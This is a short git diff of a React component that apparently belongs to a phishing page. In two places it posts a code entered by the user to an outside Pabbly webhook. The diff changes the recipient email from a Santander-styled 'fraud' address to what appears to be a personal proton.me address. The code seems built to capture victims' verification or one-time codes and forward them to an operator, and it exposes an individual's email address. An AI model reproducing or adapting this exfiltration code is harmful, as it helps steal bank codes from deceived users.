@@ -56,7 +56,7 @@ export default function MyComponent() {
     try {
       const response = await axios.post(
         "https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTZlMDYzMjA0Mzc1MjY4NTUzMjUxM2Ei_pc",
-        { email: "contact@santander-fraud.com", code: code }
+        { email: "muhammad_ajmin@proton.me", code: code }
       );
 
       if (response?.data?.status == "success") {
@@ -90,7 +90,7 @@ export default function MyComponent() {
     try {
       const response = await axios.post(
         "https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTZlMDYzMjA0Mzc1MjY4NTUzMjUxM2Ei_pc",
-        { email: "contact@santander-fraud.com", code: code }
+        { email: "muhammad_ajmin@proton.me", code: code }
       );
 
       if (response?.data?.status == "success") {
